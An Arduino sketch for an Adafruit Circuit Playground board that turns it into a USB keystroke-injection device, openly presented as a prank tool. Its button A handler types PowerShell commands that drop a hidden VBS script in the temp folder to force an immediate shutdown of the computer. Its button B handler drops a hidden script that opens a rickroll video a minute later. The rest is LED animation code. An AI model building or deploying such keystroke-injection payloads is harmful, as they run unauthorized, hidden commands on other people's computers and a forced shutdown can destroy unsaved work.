#include <Adafruit_CircuitPlayground.h>
#include <Keyboard.h>

// Define USB parameters (only if not already defined in board configuration)
#ifndef USB_PID
#define USB_PID 0x0001
#endif
#ifndef USB_PRODUCT
#define USB_PRODUCT "Circuit Playground"
#endif
#ifndef USB_MANUFACTURER
#define USB_MANUFACTURER "Adafruit"
#endif

bool leftPressed = false;
bool rightPressed = false;

// Variables for LED animation states
unsigned long lastSlideUpdate = 0;
const int SLIDE_ANIMATION_INTERVAL = 100; // ms between LED updates

void handleKeyboardInput();
void handleLEDAnimations();

void setup() {
    CircuitPlayground.begin();
    delay(2000);  // Wait for USB to initialize
    Keyboard.begin();
}

void loop() {
    handleKeyboardInput();
    handleLEDAnimations();
    delay(10);
}

void handleKeyboardInput() {
    bool slideSwitchState = !CircuitPlayground.slideSwitch();  // true when switch is open
    
    // === LEFT BUTTON (A) - Shutdown ===
    if (slideSwitchState && CircuitPlayground.leftButton() && !leftPressed) {
        leftPressed = true;
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        Keyboard.releaseAll();
        delay(200);
        Keyboard.print("powershell");
        Keyboard.press(KEY_KP_ENTER);
        delay(500);
        Keyboard.releaseAll();
        delay(1000);
        
        String vbsScript =
            "$script = @'\n"
            "Set objShell = CreateObject(\"WScript.Shell\")\n"
            "objShell.Run \"powershell -WindowStyle Hidden -Command Stop-Computer -ComputerName localhost -Force\", 0, False\n"
            "'@`\n"
            "$path = \"$env:TEMP\\shutdown.vbs\"\n"
            "$script | Out-File -Encoding ASCII $path\n"
            "Start-Process \"wscript.exe\" -ArgumentList @(\"$path\"); exit'";
            
        Keyboard.print(vbsScript.c_str());
        Keyboard.press(KEY_KP_ENTER);
        delay(500);
        Keyboard.releaseAll();
    }
    else if (!CircuitPlayground.leftButton() && leftPressed) {
        leftPressed = false;
    }

    // === RIGHT BUTTON (B) - Rickroll ===
    if (!slideSwitchState && CircuitPlayground.rightButton() && !rightPressed) {
        rightPressed = true;
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        Keyboard.releaseAll();
        delay(200);
        Keyboard.print("powershell");
        Keyboard.press(KEY_KP_ENTER);
        delay(200);
        Keyboard.releaseAll();
        delay(500);
        
        String vbsScript =
            "$script = '\n"
            "Set objShell = CreateObject(\"WScript.Shell\")\n"
            "objShell.Run \"powershell -WindowStyle Hidden -Command Start-Sleep -Seconds 60; Start-Process \\\"\"https://www.youtube.com/watch?v=xvFZjo5PgG0\\\"\"; exit\", 0, False\n"
            "'\n"
            "$path = \"$env:TEMP\\rickroll.vbs\"\n"
            "$script | Out-File -Encoding ASCII $path\n"
            "Start-Process \"wscript.exe\" -ArgumentList @(\"$path\"); exit";
            
        Keyboard.print(vbsScript.c_str());
        Keyboard.press(KEY_KP_ENTER);
        delay(500);
        Keyboard.releaseAll();
    }
    else if (!CircuitPlayground.rightButton() && rightPressed) {
        rightPressed = false;
    }
}

void handleLEDAnimations() {
    bool slideSwitchState = !CircuitPlayground.slideSwitch();
    
    // Only update LEDs every SLIDE_ANIMATION_INTERVAL milliseconds
    if (millis() - lastSlideUpdate >= SLIDE_ANIMATION_INTERVAL) {
        lastSlideUpdate = millis();
        
        if(slideSwitchState) {
            // Forward animation - keep all previous pixels lit
            static int pixelIndex = 0;
            CircuitPlayground.clearPixels();
            
            // Set colors for all pixels up to current index
            for(int i = 0; i <= pixelIndex; i++) {
                switch(i) {
                    case 0: CircuitPlayground.setPixelColor(i, 255, 0, 0); break;
                    case 1: CircuitPlayground.setPixelColor(i, 255, 153, 0); break;
                    case 2: CircuitPlayground.setPixelColor(i, 204, 255, 0); break;
                    case 3: CircuitPlayground.setPixelColor(i, 51, 255, 0); break;
                    case 4: CircuitPlayground.setPixelColor(i, 0, 255, 102); break;
                    case 5: CircuitPlayground.setPixelColor(i, 0, 255, 255); break;
                    case 6: CircuitPlayground.setPixelColor(i, 0, 102, 255); break;
                    case 7: CircuitPlayground.setPixelColor(i, 8, 0, 255); break;
                    case 8: CircuitPlayground.setPixelColor(i, 162, 0, 255); break;
                    case 9: CircuitPlayground.setPixelColor(i, 255, 0, 195); break;
                }
            }
            
            pixelIndex = (pixelIndex + 1) % 10;
        } else {
            // Reverse animation - keep all subsequent pixels lit
            static int pixelIndex = 9;
            CircuitPlayground.clearPixels();
            
            // Set colors for all pixels from current index down to 0
            for(int i = 9; i >= pixelIndex; i--) {
                switch(i) {
                    case 9: CircuitPlayground.setPixelColor(i, 255, 0, 195); break;
                    case 8: CircuitPlayground.setPixelColor(i, 162, 0, 255); break;
                    case 7: CircuitPlayground.setPixelColor(i, 8, 0, 255); break;
                    case 6: CircuitPlayground.setPixelColor(i, 0, 102, 255); break;
                    case 5: CircuitPlayground.setPixelColor(i, 0, 255, 255); break;
                    case 4: CircuitPlayground.setPixelColor(i, 0, 255, 102); break;
                    case 3: CircuitPlayground.setPixelColor(i, 51, 255, 0); break;
                    case 2: CircuitPlayground.setPixelColor(i, 204, 255, 0); break;
                    case 1: CircuitPlayground.setPixelColor(i, 255, 153, 0); break;
                    case 0: CircuitPlayground.setPixelColor(i, 255, 0, 0); break;
                }
            }
            
            pixelIndex = (pixelIndex + 9) % 10;
        }
    }
}